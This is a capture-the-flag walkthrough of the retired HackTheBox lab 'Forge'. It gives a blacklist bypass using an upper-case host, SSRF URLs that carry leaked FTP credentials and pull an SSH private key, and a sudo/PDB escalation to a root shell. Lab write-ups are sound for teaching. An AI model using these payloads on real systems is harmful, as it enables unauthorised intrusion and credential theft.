This box is a writeup about a retired HacktheBox machine:
[Forge](https://www.hackthebox.eu/home/machines/profile/376) publish on
September 11, 2021 by
[NoobHacker9999](https://www.hackthebox.eu/home/users/profile/393721).
This box is rated as a medium machine but could be qualified as an easy medium
:). It implies a SSRF and an LFI as well as some Python and a
[PDB](https://docs.python.org/3/library/pdb.html).

# Foothold

## Recon

Let us start as always by a `nmap` scan. Only port 80 (HTTP) and 22 (SSH) are
open.

## Website

The website is a gallery that allow to upload an image either from the
filesystem or from an URL.

We use [wfuzz](https://github.com/xmendez/wfuzz) in addition to the
[subdomain secList](https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS)
to discover that the domain admin.forge.htb exist.

    000000024:   200        1 L      4 W        27 Ch       "admin - admin"

We cannot access the admin interface as some IP filtering is in place.
We try to includ the page by uploading it as an image using the URL but it
failes with an error message: "URL contains a blacklisted address!"

We try the same inclusiion by using upper case on the "FORGE" domain and got the
page http://admin.FORGE.htb

    :::html
    <title>Admin Portal</title>
    </head>
    <body>
        <link rel="stylesheet" type="text/css" href="/static/css/main.css">
        <header>
                <nav>
                    <h1 class=""><a href="/">Portal home</a></h1>
                    <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                    <h1 class="align-right"><a href="/upload">Upload image</a></h1>
                </nav>
        </header>

        <br><br><br><br>
        <center><h1>Welcome Admins!</h1></center>
    </body>
    </html>

We look at the `announcements` page:

    :::html
    <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
    <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
    <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>


We try to load the FTP page using the disclosed credentials
`http://admin.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb/`
We got two files `user.txt` and `snap`.

We take a look at the `.ssh/id_rsa` file (worst case scenario it does not
exist) using `http://admin.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb/.ssh/id_rsa`
and got the RSA private key. We can now connect as `user` using SSH and grab the
user flag.

# Root

We look at our privileges (`sudo -l`) and we see that we can run `/usr/bin/python3 /opt/remote-manage.py`
as `root` without password. Looking at the script it is a remote manager script
that will land us a [PDB](https://docs.python.org/3/library/pdb.html) if it got
a unrecognized input. So we launch the script, connect to it using another SSH
terminal and `nc`, then we just input a "q" that will not be recognize and get
a [PDB](https://docs.python.org/3/library/pdb.html) in our first shell allowing
us to load the `os` module and execute system commands as root using
`os.system([COMMAND])`.

    :::text
    user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
    Listening on localhost:59816

    (Pdb) import os
    (Pdb) os.system('id')
    uid=0(root) gid=0(root) groups=0(root)
    0

We just grab the root SSH private key and connect on the box as `root` allowing us
to get the flag.

# Wrapping up

This box was really easy for a medium one. The root part really easy. I
triggered it by mistake as "q" for quit is an old habit. Once you get the
subdomain the user part just requires to follow the dots. A great medium box for
beginners.
